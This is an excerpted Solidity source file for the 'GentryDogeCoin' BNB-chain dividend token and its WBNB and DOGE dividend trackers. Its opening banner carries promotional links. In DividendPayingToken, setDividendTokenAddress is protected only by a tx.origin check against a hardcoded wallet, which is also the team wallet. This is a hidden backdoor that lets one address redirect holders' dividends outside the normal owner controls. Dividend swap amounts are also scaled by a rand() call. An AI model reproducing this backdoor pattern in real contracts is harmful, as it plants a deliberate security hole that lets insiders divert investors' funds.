...
/***
 * 👥Telegram:https://t.me/GentryDoge
 * 🦄Twitter:https://twitter.com/GentryDoge?s=05
 * 🌐Website:https://genntrydoge.finance    
 * 
 * 
 * 
 * 
 ...
 *               33::::,,;5G5,                     ,58Si,,:::,sHX;iH1        
 *                Sr.,:;rs1weAREGentryDogemmmm5S3GAXS:.,,::,,1AG3i,GG        
 ...
 *        i55s:.........,,,,,,,,,,,,,,,,.,,,......,.....,,....r9&5.:X1       
 *       59;.....,.     .,,,,,,,,,,,...        .............,..:1;.:&s       
 *      s8,..;DOGES3s.   .,,,,,,,.,..      i15S5h1:.........,,,..,,:99       
 *      93.:39s:rDOGEX;  ..,,,,.....    .SG3BNBBNBBGi..,,,,,,,,,,,,.,83      
 *      G5.G8  9#DDDDDX. .,,,,,,.....  iA9,.S&B###@@Mr...,,,,,,,,..,.;Xh     
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xbE7133a32e4bBCd100B6e60147b1f452B659DfFD, "Only owner can change dividend contract address");
...
contract GentryDogeCoin is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public wBNBDividendRewardsFee;
    ...
    constructor() ERC20("GentryDogeCoin", "GDoge") {
    	wBNBDividendTracker = new WBNBDividendTracker();
    	dOGEDividendTracker = new DOGEDividendTracker();

    	marketingWallet = 0x837C259Fe5CE6f3CC67345eb2027113dcFDe9615;
    	teamWallet = 0xbE7133a32e4bBCd100B6e60147b1f452B659DfFD;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "GDoge: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "GDoge: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(dOGEDividendRewardsFee).add(wBNBDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setWBNBDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = wBNBDividendRewardsFee.add(marketingFee).add(dOGEDividendRewardsFee).add(buyBackAndLiquidityFee);
            wBNBDividendEnabled = _enabled;
        }
    ...
    function setDOGEDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = dOGEDividendRewardsFee.add(marketingFee).add(wBNBDividendRewardsFee).add(buyBackAndLiquidityFee);
            dOGEDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(dOGEDividendRewardsFee).add(wBNBDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateWBNBDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(wBNBDividendTracker), "WBNBerBack: The dividend tracker already has that address");

        WBNBDividendTracker newWBNBDividendTracker = WBNBDividendTracker(payable(newAddress));

        require(newWBNBDividendTracker.owner() == address(this), "GDoge: The new dividend tracker must be owned by the GDoge token contract");
    ...
    function updateDOGEDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(dOGEDividendTracker), "GDoge: The dividend tracker already has that address");

        DOGEDividendTracker newDOGEDividendTracker = DOGEDividendTracker(payable(newAddress));

        require(newDOGEDividendTracker.owner() == address(this), "GDoge: The new dividend tracker must be owned by the GDoge token contract");
    ...
    function updateWBNBDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "GDoge: Fee must be less than 6%");
    ...
    function updateDOGEDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = dOGEDividendRewardsFee.add(wBNBDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }
    
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "GDoge: Fee must be less than 6%");
        marketingFee = newFee;
        totalFees = marketingFee.add(wBNBDividendRewardsFee).add(dOGEDividendRewardsFee).add(buyBackAndLiquidityFee);
    }
    
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "GDoge: Fee must be less than 6%");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(wBNBDividendRewardsFee).add(dOGEDividendRewardsFee).add(marketingFee);
    }

    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "GDoge: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "GDoge: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "GDoge: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "GDoge: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "GDoge: Cannot update gasForProcessing to same value");
	...
	function processDividendTracker(uint256 gas) external onlyOwner {
		...
		emit ProcessedWBNBDividendTracker(wBNBIterations, wBNBClaims, wBNBLastProcessedIndex, false, gas, tx.origin);
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "GDoge: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (wBNBDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(wBNBDividendRewardsFee.add(dOGEDividendRewardsFee)).mul(wBNBDividendRewardsFee);
                    swapAndSendWBNBDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (dOGEDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(wBNBDividendRewardsFee.add(dOGEDividendRewardsFee)).mul(dOGEDividendRewardsFee);
...
contract WBNBDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("GDoge_WBNB_Dividend_Tracker", "GDoge_WBNB_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "GDoge_WBNB_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "GDoge_WBNB_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main GDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "GDoge_WBNB_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "GDoge_WBNB_Dividend_Tracker: Cannot update claimWait to same value");
...
contract DOGEDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("GDoge_DOGE_Dividend_Tracker", "GDoge_DOGE_Dividend_Tracker", 0xbA2aE424d960c26247Dd6c32edC70B295c744C43) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "GDoge_DOGE_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "GDoge_DOGE_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main GDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "GDoge_DOGE_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "GDoge_DOGE_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
